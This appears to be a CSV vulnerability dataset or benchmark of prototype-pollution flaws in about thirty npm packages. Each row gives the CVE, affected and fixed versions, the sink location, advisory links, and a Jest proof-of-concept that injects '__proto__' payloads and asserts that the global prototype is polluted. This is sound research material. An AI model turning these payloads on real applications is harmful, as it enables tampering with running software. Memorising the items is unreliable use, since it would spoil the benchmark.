Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2021-25946,nconf-toml,0.0.1,,prototype-pollution/nconf-toml_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946

test(""prototype pollution in nconf-toml"", () => {
  expect({}.polluted).toBe(undefined);

  const nt = require(""nconf-toml"");
  const fs = require(""fs"");
  const path = require(""path"");

  nt.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",,lib/compiler.js:55:18,https://security.snyk.io/vuln/SNYK-JS-NCONFTOML-1296831; https://github.com/advisories/GHSA-hx7j-43w2-7rj7
prototype-pollution,CVE-2020-8147,utils-extend,1.0.8,,prototype-pollution/utils-extend_1.0.8,"//https://hackerone.com/reports/801522

test(""prototype pollution in utils-extend"", () => {
  const { extend } = require(""utils-extend"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  const pollutionObject = JSON.parse(payload);
  extend({}, pollutionObject);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:46:19,https://security.snyk.io/vuln/SNYK-JS-UTILSEXTEND-560385; https://github.com/advisories/GHSA-6pq3-928q-x6w6
prototype-pollution,CVE-2020-28280,predefine,0.1.2,,prototype-pollution/predefine_0.1.2,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
test(""prototype pollution in predefine"", () => {
  expect({}.polluted).toBe(undefined);

  var predefine = require(""predefine"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  predefine.merge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:284:21,https://security.snyk.io/vuln/SNYK-JS-PREDEFINE-1054935; https://github.com/advisories/GHSA-mx3x-ghqm-r43h
prototype-pollution,CVE-2020-28283,libnested,1.5.0,1.5.1,prototype-pollution/libnested_1.5.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
test(""prototype pollution in libnested"", () => {
  expect({}.polluted).toBe(undefined);

  const libnested = require(""libnested"");
  libnested.set({}, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/dominictarr/libnested/commit/9619863a319ed1e5c19ddcbdbe3312f9cef72760,index.js:27:20,https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-1054930; https://github.com/advisories/GHSA-3r9x-mjrm-2725
prototype-pollution,CVE-2021-25943,101,1.0.0,,prototype-pollution/101_1.0.0,"test(""prototype pollution in 101/set"", () => {
  expect({}.polluted).toBe(undefined);

  const _101 = require(""101/set"");
  // console.log(_101)
  _101({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:32:16,https://github.com/advisories/GHSA-cwcx-rxgc-cmw3; https://security.snyk.io/vuln/SNYK-JS-101-1292345
prototype-pollution,CVE-2019-10808,utilitify,1.0.2,1.0.3,prototype-pollution/utilitify_1.0.2,"//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
test(""prototype pollution in utilitify"", () => {
  const { mergeDeep } = require(""utilitify"");
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  var result = mergeDeep(
    { a: { b: { c: ""c"", d: ""d"" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/xcritical-software/utilitify/commit/88d6e27009823338bf319ffb768fe6b08e8ad2d1,utils/utils/mergeDeep.ts:17:18,https://security.snyk.io/vuln/SNYK-JS-UTILITIFY-559497; https://github.com/advisories/GHSA-9534-h433-2rjf
prototype-pollution,CVE-2020-7727,gedi,1.6.3,,prototype-pollution/gedi_1.6.3,"//https://snyk.io/vuln/SNYK-JS-GEDI-598803
test(""prototype pollution in gedi"", () => {
  expect({}.polluted).toBe(undefined);

  const gedi = require(""gedi"");
  gedi().set(""[__proto__/polluted]"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,gedi.js:393:32,https://security.snyk.io/vuln/SNYK-JS-GEDI-598803; https://github.com/advisories/GHSA-jh2m-j8pp-55rc
prototype-pollution,CVE-2020-7724,tiny-conf,1.1.0,,prototype-pollution/tiny-conf_1.1.0,"//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
test(""prototype pollution in tinyConf"", () => {
  const tinyConf = require(""tiny-conf"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  tinyConf.set(""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,tiny-conf.js:73:17,https://security.snyk.io/vuln/SNYK-JS-TINYCONF-598792; https://github.com/advisories/GHSA-4q97-fh3f-j294
prototype-pollution,,sahmat,1.0.0,,prototype-pollution/sahmat_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
test(""prototype pollution in sahmat"", () => {
  const sahmat = require(""sahmat"");
  let obj = { tmp: """" };

  expect({}.polluted).toBe(undefined);

  sahmat(obj, ""tmp"", (obj.__proto__.polluted = ""yes""));

  expect(obj.tmp.polluted).toBe(""yes"");
});
",,build/utils.js:391:28,https://github.com/advisories/GHSA-83pq-466j-fc6j; 
prototype-pollution,CVE-2020-7718,gammautils,0.0.81,,prototype-pollution/gammautils_0.0.81,"//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
test(""prototype pollution in gammautils"", () => {
  expect({}.polluted).toBe(undefined);

  const gammautils = require(""gammautils"");
  var payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  gammautils.object.deepMerge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",,lib/objectUtils.js:146:34,https://security.snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670; https://github.com/advisories/GHSA-pgmg-gf5p-54j8
prototype-pollution,CVE-2021-23509,json-ptr,1.1.0,3.0.0,prototype-pollution/json-ptr_1.1.0,"//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
test(""prototype pollution in json-ptr"", () => {
  expect({}.polluted).toBe(undefined);

  const { JsonPointer } = require(""json-ptr"");
  JsonPointer.set({}, ""/constructor/prototype/polluted"", ""yes"", true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/flitbit/json-ptr/commit/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,index.js:277:26,https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1577291; https://github.com/advisories/GHSA-8gwj-8hxc-285w
prototype-pollution,CVE-2021-23434,object-path,0.11.4,0.11.6,prototype-pollution/object-path_0.11.4,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
test(""prototype pollution in object-path"", () => {
  const objectPath = require(""object-path"");

  expect({}.polluted).toBe(undefined);
  objectPath.withInheritedProps.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb,index.js:110:28,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453; https://github.com/advisories/GHSA-v39p-96qg-c8rf
prototype-pollution,CVE-2021-25914,object-collider,1.0.3,1.0.4,prototype-pollution/object-collider_1.0.3,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

test(""prototype pollution in object-collider"", () => {
  var { collide } = require(""object-collider"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  collide(obj, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/FireBlinkLTD/object-collider/commit/321f75a7f8e7b3393e5b7dd6dd9ab26ede5906e5,src/utils/CollideUtil.ts:83:22,https://security.snyk.io/vuln/SNYK-JS-OBJECTCOLLIDER-1080739; https://github.com/advisories/GHSA-85g2-29m8-qf2p
prototype-pollution,CVE-2020-7700,phpjs,1.3.2,,prototype-pollution/phpjs_1.3.2,"//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

test(""prototype pollution in phpjs"", () => {
  expect({}.polluted).toBe(undefined);

  const p = require(""phpjs"");
  p.parse_str(""__proto__[polluted]=yes"", {});

  expect({}.polluted).toBe(""yes"");
});
",,build/npm.js:6406:24,https://security.snyk.io/vuln/SNYK-JS-PHPJS-598681; https://github.com/advisories/GHSA-m428-jqc4-2p5j
prototype-pollution,CVE-2020-28272,keyget,2.2.0,2.3.0,prototype-pollution/keyget_2.2.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272
test(""prototype pollution in keyget"", () => {
  var keyget = require(""keyget"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  keyget.set({}, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/rumkin/keyget/commit/17d15b6c75036eb429075a8cfeccfc18094dd2e2,index.js:111:17,https://security.snyk.io/vuln/SNYK-JS-KEYGET-1048048; 
prototype-pollution,CVE-2021-26707,merge-deep,3.0.0,3.0.3,prototype-pollution/merge-deep_3.0.0,"// https://snyk.io/vuln/npm:merge-deep:20180215
test(""prototype pollution in merge-deep"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge-deep"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/merge-deep/commit/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP-1070277; https://github.com/advisories/GHSA-r6rj-9ch6-g264
prototype-pollution,CVE-2020-7774,y18n,3.2.1,5.0.5,prototype-pollution/y18n_3.2.1,"//https://snyk.io/test/npm/y18n/3.1.0

test(""prototype pollution in y18n"", () => {
  const y18n = require(""y18n"")();
  obj = {};

  expect({}.polluted).toBe(undefined);

  y18n.setLocale(""__proto__"");
  y18n.updateLocale({ polluted: ""yes"" }); //payload

  expect({}.polluted).toBe(""yes"");
});
",,index.js:156:34,https://security.snyk.io/vuln/SNYK-JS-Y18N-1021887; https://github.com/advisories/GHSA-c4w7-xm78-47vh
prototype-pollution,CVE-2021-23402,record-like-deep-assign,1.0.1,,prototype-pollution/record-like-deep-assign_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
test(""prototype pollution in x-assign"", () => {
  const deepAssign = require(""record-like-deep-assign"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  deepAssign({}, EVIL_JSON);

  expect({}.polluted).toBe(""yes"");
});
",,src/mod.ts:34:9,https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024; https://github.com/advisories/GHSA-7qm6-9v49-38m9
prototype-pollution,CVE-2021-23820,json-pointer,0.6.1,,prototype-pollution/json-pointer_0.6.1,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,index.js:98:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287; https://github.com/advisories/GHSA-v5vg-g7rq-363w
prototype-pollution,CVE-2020-7720,node-forge,0.9.0,0.10.0,prototype-pollution/node-forge_0.9.0,"//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
test(""prototype pollution in node-forge"", () => {
  expect({}.polluted).toBe(undefined);

  const nodeforge = require(""node-forge"");
  const obj = {};
  nodeforge.util.setPath(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562,lib/util.js:2536:22,https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677; https://github.com/advisories/GHSA-92xj-mqp7-vmcj
prototype-pollution,,lutils-merge,0.2.6,,prototype-pollution/lutils-merge_0.2.6,"//https://hackerone.com/reports/439107
test(""prototype pollution in lutils-merge"", () => {
  const merge = require(""lutils-merge"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",,merge.js:156:23,https://security.snyk.io/vuln/SNYK-JS-LUTILSMERGE-174783; https://github.com/advisories/GHSA-f7qw-5pvg-mmwp
prototype-pollution, CVE-2021-25953,putil-merge,3.0.0,3.7.0,prototype-pollution/putil-merge_3.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
test(""prototype pollution in putil-merge"", () => {
  const putil_merge = require(""putil-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  var obj = {};

  expect({}.polluted).toBe(undefined);

  putil_merge(obj, payload, { deep: true });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/panates/putil-merge/commit/a8f5087faaa034cc2dc2e8070c13014ad6a34043,lib/merge.js:72:19,https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077; https://github.com/advisories/GHSA-9x7m-9hpg-xxmw
prototype-pollution,CVE-2020-7713,arr-flatten-unflatten,1.1.4,,prototype-pollution/arr-flatten-unflatten_1.1.4,"//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
test(""prototype pollution in arr-flatten-unflatten"", () => {
  expect({}.polluted).toBe(undefined);

  const { unflatten } = require(""arr-flatten-unflatten"");
  unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",,unflatten.js:17:16,https://security.snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396; https://github.com/advisories/GHSA-w8f3-pvx4-4c3h
prototype-pollution,CVE-2019-11358,jquery,1.11.0, 3.4.0,prototype-pollution/jquery_1.11.0,"//https://hackerone.com/reports/454365
test(""prototype pollution in jquery"", () => {
  const { JSDOM } = require(""jsdom"");
  const { window } = new JSDOM("""");
  const $ = require(""jquery"")(window);

  obj = {};

  expect({}.polluted).toBe(undefined);

  $.extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b,dist/jquery.js:230:21,https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006; https://github.com/advisories/GHSA-6c3j-c64m-qhgq
prototype-pollution,CVE-2020-7702,Templ8,0.7.0,,prototype-pollution/Templ8_0.7.0,"//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
test(""prototype pollution in Templ8"", () => {
  expect({}.polluted).toBe(undefined);

  const Templ8 = require(""Templ8"");
  const tpl = new Templ8('{{__proto__.polluted=""yes""}}');
  tpl.parse();

  try {
    expect(polluted).toBe(""yes"");
  } catch {
    expect(false).toBe(true);
  }
});
",,,https://security.snyk.io/vuln/SNYK-JS-TEMPL8-598770; https://github.com/advisories/GHSA-c7m7-4257-h698
prototype-pollution,CVE-2020-28461,js-ini,1.2.0,1.3.0,prototype-pollution/js-ini_1.2.0,"//https://snyk.io/vuln/SNYK-JS-JSINI-1048970
test(""prototype pollution in js-ini"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ini = require(""js-ini"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e,src/parse.ts:68:58,https://security.snyk.io/vuln/SNYK-JS-JSINI-1048970; 
prototype-pollution,CVE-2021-23426,Proto,1.1.4,,prototype-pollution/Proto_1.1.4,"//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
test(""prototype pollution in Proto"", () => {
  const proto = require(""Proto"");
  let payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  proto.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",,,https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301; https://github.com/advisories/GHSA-58g2-9fqr-36q2
prototype-pollution,,@uifabric/utilities,7.20.2,7.20.3,prototype-pollution/uifabric-utilities_7.20.2,"//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
test(""prototype pollution in @uifabric/utilities "", () => {
  const util = require(""@uifabric/utilities"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  y = util.merge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,utilities/src/merge.ts:33:21,https://security.snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487; 
prototype-pollution,CVE-2021-23820,json-pointer,0.6.0,,prototype-pollution/json-pointer_0.6.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set(obj, ""/__proto__/polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/manuelstofer/json-pointer/pull/34/files,index.js:91:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925; https://github.com/advisories/GHSA-v5vg-g7rq-363w
prototype-pollution,CVE-2018-3728,hoek,5.0.0,5.0.3,prototype-pollution/hoek_5.0.0,"//https://snyk.io/vuln/npm:hoek:20180212
test(""prototype pollution in hoek"", () => {
  const Hoek = require(""hoek"");
  obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  Hoek.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee,lib/index.js:137:29,https://security.snyk.io/vuln/npm:hoek:20180212; https://github.com/advisories/GHSA-jp4x-w63m-7wgm
prototype-pollution,CVE-2020-28267,@strikeentco/set,1.0.0,1.0.1,prototype-pollution/strikeentco-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
test(""prototype pollution in strikeentco/set "", () => {
  const sset = require(""@strikeentco/set"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  sset(obj, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/strikeentco/set/commit/102cc6b2e1d1e0c928ced87e75df759d5541ff60,set/main.js:11:17,https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821; 
prototype-pollution,CVE-2021-25927,safe-flat,2.0.0,2.0.2,prototype-pollution/safe-flat_2.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
test(""prototype pollution in safeFlat"", () => {
  var safeFlat = require(""safe-flat"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeFlat.unflatten({ ""__proto__.polluted"": ""yes"" }, "".""); //payload
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,src/index.js:48:30,https://security.snyk.io/vuln/SNYK-JS-SAFEFLAT-1277112; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
